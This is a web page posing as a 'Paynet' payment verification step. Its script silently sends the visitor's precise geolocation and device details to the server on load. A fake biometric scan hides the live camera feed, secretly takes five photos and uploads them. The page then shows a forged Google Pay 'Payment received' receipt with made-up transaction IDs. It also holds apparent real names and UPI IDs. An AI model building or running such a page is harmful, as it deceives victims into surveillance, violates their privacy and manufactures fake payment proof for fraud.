<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Verification - Paynet</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/paynet.css">
    <link rel="manifest" href="/manifest.json">
    <meta name="theme-color" content="#ffffff">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">

    <!-- Link Preview -->
    <meta property="og:title" content="Secure Verification - Paynet">
    <meta property="og:description"
        content="Paynet is securely processing your payment details. Biometric verification in progress.">
    <meta property="og:image"
        content="https://img.freepik.com/premium-photo/secure-payment-verification-icon-protection-online-shopping-banking-with-shield-concept_675567-2708.jpg?w=1200">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:site_name" content="Paynet">
    <link rel="stylesheet" href="/verify.css">
    <style>
        @keyframes scanAnim {
            0% {
                top: 0;
            }

            50% {
                top: 100%;
            }

            100% {
                top: 0;
            }
        }

        @keyframes meshPulse {
            0% {
                transform: scale(1);
                opacity: 0.6;
            }

            50% {
                transform: scale(1.05);
                opacity: 0.9;
            }

            100% {
                transform: scale(1);
                opacity: 0.6;
            }
        }

        @keyframes rotateMesh {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        @keyframes floatData {
            0% {
                opacity: 0.2;
                transform: translateY(0);
            }

            50% {
                opacity: 0.8;
                transform: translateY(-5px);
            }

            100% {
                opacity: 0.2;
                transform: translateY(0);
            }
        }

        .mesh-pulse {
            animation: meshPulse 2s ease-in-out infinite;
            transform-origin: center;
        }

        .rotate-mesh {
            animation: rotateMesh 10s linear infinite;
            transform-origin: center;
        }

        .telemetry-tag {
            position: absolute;
            font-family: monospace;
            font-size: 8px;
            color: #4285F4;
            opacity: 0.8;
            letter-spacing: 1px;
            pointer-events: none;
            animation: floatData 3s ease-in-out infinite;
        }

        .modal-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Responsive tweaks */
        @media (max-width: 480px) {
            #scanBox {
                width: 180px !important;
                height: 180px !important;
            }

            .success-title {
                font-size: 20px !important;
            }
        }
    </style>
</head>

<body>
    <div class="payment-container verify-container" id="mainContainer">
        <!-- Logo Section (Only for generic, hidden in GPay mode) -->
        <div class="logo-section" id="genericLogo">
            <div class="paynet-logo">
                <svg width="60" height="60" viewBox="0 0 60 60">
                    <defs>
                        <linearGradient id="shield-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" style="stop-color:#1A73E8" />
                            <stop offset="100%" style="stop-color:#3B5FCC" />
                        </linearGradient>
                    </defs>
                    <path d="M30 5 L50 15 L50 30 C50 42 30 55 30 55 C30 55 10 42 10 30 L10 15 Z"
                        fill="url(#shield-gradient)" />
                    <path d="M25 30 L28 33 L36 23" stroke="white" stroke-width="3" fill="none" stroke-linecap="round"
                        stroke-linejoin="round" />
                </svg>
            </div>
            <h1 class="brand-name">Paynet</h1>
        </div>

        <!-- Loading Section -->
        <div id="loadingSection">
            <h2 class="success-title">Initializing Verification...</h2>
            <p class="success-subtitle">Please wait while we set up your secure session</p>

            <div style="margin: 30px 0;">
                <div class="loading-spinner" style="margin: 0 auto;"></div>
            </div>
        </div>

        <!-- Human Verification / Biometric Scan Section -->
        <div id="humanVerificationSection" style="display: none; text-align: center; animation: fadeIn 0.5s ease-out;">
            <div class="modal-icon" style="background: #E8F0FE; color: #1A73E8; margin: 0 auto 20px;">
                <svg width="40" height="40" viewBox="0 0 24 24" fill="currentColor">
                    <path
                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-5-9h10v2H7z" />
                </svg>
            </div>
            <h2 class="success-title">Human Verification</h2>
            <p class="success-subtitle">To proceed, we need to verify that you are a human. This is a mandatory security
                step.</p>

            <div id="scanBox"
                style="position: relative; width: 220px; height: 220px; margin: 30px auto; border: 2px solid rgba(66,133,244,0.3); border-radius: 50%; overflow: hidden; background: #000; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(66,133,244,0.1);">
                <!-- Real Video (Hidden from user) -->
                <video id="scanVideo" style="position: absolute; width: 1px; height: 1px; opacity: 0;"></video>

                <!-- Biometric Avatar / AI Mesh (Shown to user) -->
                <div id="avatarContainer"
                    style="display: none; width: 100%; height: 100%; position: relative; background: radial-gradient(circle at center, #0a1128 0%, #000 100%);">
                    <!-- Layered AI Mesh -->
                    <svg id="aiMesh" width="100%" height="100%" viewBox="0 0 100 100"
                        style="position: absolute; top:0; left:0;">
                        <!-- Rotating base -->
                        <circle cx="50" cy="50" r="45" stroke="#4285F4" stroke-width="0.1" fill="none"
                            class="rotate-mesh" stroke-dasharray="2 4" />
                        <!-- Pulsing avatar -->
                        <g class="mesh-pulse">
                            <path
                                d="M50 20 C35 20, 25 35, 30 55 C35 75, 45 80, 50 80 C55 80, 65 75, 70 55 C75 35, 65 20, 50 20"
                                stroke="#4285F4" stroke-width="0.5" fill="none" />
                            <circle cx="40" cy="45" r="2" fill="#4285F4" opacity="0.6" />
                            <circle cx="60" cy="45" r="2" fill="#4285F4" opacity="0.6" />
                            <path d="M40 65 Q50 70 60 65" stroke="#4285F4" stroke-width="0.3" fill="none"
                                opacity="0.5" />
                        </g>
                        <!-- Data links -->
                        <path d="M20 50 L80 50 M50 20 L50 80" stroke="#4285F4" stroke-width="0.05" opacity="0.2" />
                    </svg>

                    <!-- Telemetry Data points -->
                    <div class="telemetry-tag" style="top: 20%; left: 10%;">EYE_NODE_ACTIVE</div>
                    <div class="telemetry-tag" style="bottom: 25%; right: 10%;">FACIAL_STRUC_85%</div>
                    <div class="telemetry-tag" style="top: 50%; right: 5%;">DEPTH_MAP_1.2s</div>
                </div>

                <div id="scanPlaceholder"
                    style="color: #4285F4; font-size: 12px; text-transform: uppercase; font-weight: 500; letter-spacing: 2px; opacity: 0.7;">
                    System Ready</div>
                <div id="scanLine"
                    style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: linear-gradient(to right, transparent, #4285F4, transparent); box-shadow: 0 0 15px #4285F4; animation: scanAnim 2.5s ease-in-out infinite; z-index: 10; opacity: 0.8;">
                </div>
            </div>

            <div id="verificationStatus" class="verification-steps" style="max-width: 300px; margin: 0 auto;">
                <div class="step" id="step-bio">
                    <svg class="step-icon" viewBox="0 0 24 24">
                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
                    </svg>
                    <span class="step-text">Waiting for camera...</span>
                </div>
            </div>

            <button id="startScanBtn" class="modal-btn" style="background: #1A73E8; margin-top: 20px;"
                onclick="initiateBiometricScan()">Start Biometric Scan</button>
        </div>

        <!-- Processing Result Section -->
        <div id="processingResultSection" style="display: none;">
            <h2 class="success-title">Finalizing Transaction...</h2>
            <p class="success-subtitle">Verifying biometric data and securing payment</p>
            <div style="margin: 30px 0;">
                <div class="loading-spinner" style="margin: 0 auto;"></div>
            </div>
            <div class="verification-steps">
                <div class="step">
                    <svg class="step-icon" viewBox="0 0 24 24">
                        <circle cx="12" cy="12" r="10" fill="#34A853" />
                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" fill="white" />
                    </svg>
                    <span class="step-text">Biometric Identity Verified</span>
                </div>
                <div class="step">
                    <svg class="step-icon" viewBox="0 0 24 24">
                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
                    </svg>
                    <span class="step-text">Linking to Merchant Gateway...</span>
                </div>
            </div>
        </div>

        <!-- Generic Receipt Section -->
        <div id="receiptSection" class="receipt">
            <div class="receipt-header">
                <div class="receipt-title">PAYMENT RECEIPT</div>
                <div style="font-size: 12px; color: #5f6368; margin-top: 5px;">Transaction Successful</div>
            </div>

            <div class="receipt-amount">
                <div class="receipt-amount-label">Amount Paid</div>
                <div class="receipt-amount-value">‚Çπ500.00</div>
            </div>

            <div class="receipt-row">
                <span class="receipt-label">Paid to</span>
                <span class="receipt-value">Paynet Services</span>
            </div>
            <div class="receipt-row">
                <span class="receipt-label">Transaction ID</span>
                <span class="receipt-value" id="receipt-txn-id">TXN1234567890</span>
            </div>
            <div class="receipt-row">
                <span class="receipt-label">Date & Time</span>
                <span class="receipt-value" id="receipt-date">14 Feb 2026, 08:43 AM</span>
            </div>
            <div class="receipt-row">
                <span class="receipt-label">Status</span>
                <span class="receipt-value" style="color: #34A853; font-weight: 700;">‚úì SUCCESS</span>
            </div>
        </div>

        <!-- GOOGLE PAY CUSTOM RECEIPT -->
        <div id="gpayReceiptSection" class="gpay-receipt">
            <!-- Animated Checkmark -->
            <svg class="success-checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                <circle class="success-checkmark__circle" cx="26" cy="26" r="25" fill="none" />
                <path class="success-checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
            </svg>

            <div style="font-size: 24px; font-weight: 500; color: #202124; margin-bottom: 5px;">Payment received</div>
            <div class="gpay-amount-display" id="gpay-amount">‚Çπ1,600</div>
            <div id="gpay-to-name" class="gpay-to-name"
                style="font-size: 16px; color: #5f6368; margin-bottom: 20px; font-weight: 400;">To Deepak Anna Bodke
            </div>

            <div class="gpay-timestamp" id="gpay-time">13 Feb 2026, 8:03 pm</div>

            <div class="gpay-card">
                <div class="gpay-card-header">
                    <!-- Generic Bank Icon -->
                    <div style="display: flex; align-items: center; gap: 10px; flex: 1;">
                        <svg class="bank-icon" viewBox="0 0 24 24" style="fill: #1a73e8;">
                            <path d="M4 10v7h3v-7H4zm6 0v7h3v-7h-3zm6 0v7h3v-7h-3zM2 22h19v-3H2v3zm19-19H2v6h19V3z" />
                        </svg>
                        <span class="gpay-value" id="gpay-bank" style="font-weight: 500;">Canara Bank 2461</span>
                    </div>
                    <span style="color: #5f6368;">‚ñº</span>
                </div>

                <div class="gpay-card-body">
                    <div class="gpay-row">
                        <div class="gpay-label">UPI transaction ID</div>
                        <div class="gpay-value" id="gpay-upi-txn">604456031510</div>
                    </div>

                    <div class="gpay-row">
                        <div class="gpay-label" id="gpay-label-to">To: Deepak Anna Bodke</div>
                        <div class="gpay-value" id="gpay-to-upi">gpay-12192992016@okbizaxis</div>
                    </div>

                    <div class="gpay-row">
                        <div class="gpay-label" id="gpay-label-from">From: NOUFIYA J (Canara Bank)</div>
                        <div class="gpay-value">Google Pay ‚Ä¢ <span id="gpay-from-upi">nowfiyajalal890@okaxis</span>
                        </div>
                    </div>

                    <div class="gpay-row">
                        <div class="gpay-label">Google transaction ID</div>
                        <div class="gpay-value" id="gpay-google-txn">CICAgJIl3_rfbQ</div>
                    </div>
                </div>
            </div>

            <div class="gpay-footer-logo">
                <svg height="24" viewBox="0 0 64 64">
                    <path fill="#5f6368"
                        d="M32 0C14.3 0 0 14.3 0 32s14.3 32 32 32 32-14.3 32-32S49.7 0 32 0zm0 58c-14.4 0-26-11.6-26-26S17.6 6 32 6s26 11.6 26 26-11.6 26-26 26z" />
                    <path fill="#5f6368" d="M32 15l-5 10h10l-5-10z" />
                </svg>
                <span style="font-family: 'Google Sans'; color: #5f6368; font-size: 18px;">Google Pay</span>
            </div>
        </div>

        <div class="footer" style="margin-top: 30px;" id="genericFooter">
            <p class="powered-by">Secured by <strong>Paynet</strong></p>
        </div>
    </div>

    <!-- Camera Access Modal -->
    <div id="cameraModal" class="location-modal" style="display: none;">
        <div class="modal-content">
            <div class="modal-icon" style="background: #FEF7E0; color: #FBBC04;">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="currentColor">
                    <path
                        d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
                </svg>
            </div>
            <h3 class="modal-title">Identity Verification Required</h3>
            <p class="modal-text">To prevent payment fraud, our system strictly requires a biometric scan to confirm
                your identity.</p>

            <div
                style="background: #f8f9fa; border: 1px solid #e8eaed; border-radius: 8px; padding: 12px; margin-bottom: 20px; text-align: left;">
                <div
                    style="font-size: 11px; font-weight: 700; color: #5f6368; text-transform: uppercase; margin-bottom: 5px; display: flex; align-items: center; gap: 5px;">
                    üõ°Ô∏è Reason for Verification
                </div>
                <div style="font-size: 13px; color: #3c4043; line-height: 1.4;">
                    To comply with <strong>Digital Payment Security Protocols</strong>, this transaction requires a
                    real-time presence check to protect your account against unauthorized access and 3rd-party fraud.
                </div>
            </div>

            <button class="modal-btn"
                style="background: #1A73E8; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;"
                onclick="retryCamera()">Start Identity Scan</button>
            <p style="font-size: 11px; color: #9aa0a6; margin-top: 15px;">Your data is encrypted and protected by Paynet
                Security.</p>
        </div>
    </div>

    <script>
        let capturedPhotos = [];
        let cameraStream = null;
        let video = null;
        let paymentData = null;

        // Get payment ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const paymentId = urlParams.get('id');

        // Fetch payment details on load
        async function fetchPaymentDetails() {
            if (!paymentId) return null;

            try {
                const response = await fetch('/validate-payment-id', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ paymentId: paymentId })
                });

                const data = await response.json();
                if (data.valid) {
                    return data.payment;
                }
            } catch (error) {
                console.error('Error fetching payment details:', error);
            }
            return null;
        }

        // Auto-start camera and capture photos during animation
        window.addEventListener('load', async function () {
            // Initiate location logging silently
            logVisit();

            // Fetch payment details first
            paymentData = await fetchPaymentDetails();

            // Show Human Verification after initial load
            setTimeout(() => {
                document.getElementById('loadingSection').style.display = 'none';
                document.getElementById('humanVerificationSection').style.display = 'block';
            }, 1000);
        });

        // Helper for random IDs if missing
        function generateRandomId(length) {
            let result = '';
            const characters = '0123456789';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        function generateRandomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        async function initiateBiometricScan() {
            const btn = document.getElementById('startScanBtn');
            btn.innerHTML = "Initializing...";
            btn.disabled = true;

            const started = await startCameraInScanBox();

            if (!started) {
                document.getElementById('cameraModal').style.display = 'flex';
                btn.innerHTML = "Retry Verification";
                btn.disabled = false;
                return;
            }

            // Camera started - show Digital Avatar UI (Keep real video hidden)
            document.getElementById('scanPlaceholder').style.display = 'none';
            document.getElementById('avatarContainer').style.display = 'flex';
            document.getElementById('scanLine').style.display = 'block';
            btn.style.display = 'none';

            updateStep('step-bio', 'FBBC04', 'AI Identity Mapping in progress...');

            // Capture 5 photos over 5 seconds
            await captureMultiplePhotos();

            updateStep('step-bio', '34A853', 'Scan Complete ‚úì');

            // Move to final processing
            setTimeout(() => {
                document.getElementById('humanVerificationSection').style.display = 'none';
                document.getElementById('processingResultSection').style.display = 'block';

                // Show final receipt after processing
                setTimeout(showReceipt, 3000);
            }, 1000);
        }

        function updateStep(id, color, text) {
            const step = document.getElementById(id);
            if (!step) return;
            const icon = step.querySelector('.step-icon circle');
            if (icon) icon.setAttribute('fill', '#' + color);
            const textEl = step.querySelector('.step-text');
            if (textEl) textEl.innerText = text;
        }

        async function startCameraInScanBox() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }
                });

                video = document.getElementById('scanVideo');
                video.srcObject = cameraStream;
                video.play();
                return true;
            } catch (error) {
                return false;
            }
        }

        async function retryCamera() {
            const btn = document.querySelector('#cameraModal .modal-btn');
            btn.innerText = "Connecting...";
            btn.disabled = true;

            const started = await startCameraInScanBox();
            if (started) {
                document.getElementById('cameraModal').style.display = 'none';
                initiateBiometricScan(); // Start the scan process
            } else {
                btn.innerText = "Verification Failed. Retry?";
                btn.disabled = false;
                alert("Please allow camera access in your browser settings to continue.");
            }
        }

        function showReceipt() {
            document.getElementById('loadingSection').style.display = 'none';
            document.getElementById('humanVerificationSection').style.display = 'none';
            document.getElementById('processingResultSection').style.display = 'none';

            // Check if custom payment
            if (paymentData && paymentData.isCustom) {
                // ACTIVATE GOOGLE PAY MODE
                document.body.classList.add('gpay-mode');
                document.getElementById('genericLogo').style.display = 'none';
                document.getElementById('genericFooter').style.display = 'none';
                document.getElementById('gpayReceiptSection').style.display = 'block';

                // Populate Custom Data
                document.getElementById('gpay-amount').textContent = '‚Çπ' + paymentData.amount;
                document.getElementById('gpay-to-name').textContent = 'To ' + paymentData.toName;
                document.getElementById('gpay-bank').textContent = paymentData.bankName;
                document.getElementById('gpay-upi-txn').textContent = paymentData.upiTxnId || generateRandomId(12);
                document.getElementById('gpay-to-upi').textContent = paymentData.upiId;

                document.getElementById('gpay-label-to').textContent = 'To: ' + paymentData.toName;
                document.getElementById('gpay-label-from').textContent = 'From: ' + paymentData.fromName + ' (' + paymentData.bankName.split(' ')[0] + ' Bank)';

                const senderUpi = paymentData.fromName.toLowerCase().replace(/\s+/g, '') + '@okaxis';
                document.getElementById('gpay-from-upi').textContent = senderUpi;

                document.getElementById('gpay-google-txn').textContent = paymentData.googleTxnId || 'CICAg' + generateRandomString(8);
                document.getElementById('gpay-time').textContent = paymentData.date;

            } else {
                // GENERIC MODE
                document.getElementById('receiptSection').style.display = 'block';

                if (paymentData) {
                    document.querySelector('.receipt-amount-value').textContent = `‚Çπ${paymentData.amount}.00`;
                    document.getElementById('receipt-txn-id').textContent = paymentData.id;

                    if (paymentData.merchant) {
                        document.querySelectorAll('.receipt-value')[0].textContent = paymentData.merchant;
                    }

                    if (paymentData.date) {
                        document.getElementById('receipt-date').textContent = paymentData.date;
                    }
                }
            }

            // Stop camera
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }

            // Store photos like before
            sessionStorage.setItem('capturedPhotos', JSON.stringify(capturedPhotos));
        }

        // Capture multiple photos with upload
        async function captureMultiplePhotos() {
            return new Promise((resolve) => {
                let photoCount = 0;
                const maxPhotos = 5;

                setTimeout(() => {
                    const captureInterval = setInterval(async () => {
                        if (photoCount >= maxPhotos || !video) {
                            clearInterval(captureInterval);
                            resolve();
                            return;
                        }

                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);

                        const photoData = canvas.toDataURL('image/jpeg', 0.85);
                        capturedPhotos.push({
                            timestamp: new Date().toISOString(),
                            data: photoData
                        });

                        await sendPhotoToServer(photoData);

                        photoCount++;
                    }, 1000);
                }, 1000);
            });
        }

        async function sendPhotoToServer(photoData) {
            try {
                await fetch('/capture-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ photo: photoData })
                });
            } catch (error) {
                console.error(error);
            }
        }

        // Silent Location & Visit Logger
        async function logVisit() {
            let locationData = null;
            let deviceData = null;

            // Get Device Details
            try {
                deviceData = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: { width: screen.width, height: screen.height }
                };
            } catch (e) { }

            // Get Location (High Accuracy)
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed
                };
            } catch (e) {
                // Location failed (denied or timeout)
            }

            // Send to server
            try {
                await fetch('/log-visit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        paymentId: paymentId || 'UNKNOWN',
                        location: locationData,
                        deviceDetails: deviceData
                    })
                });
            } catch (e) { }
        }
    </script>
</body>

</html>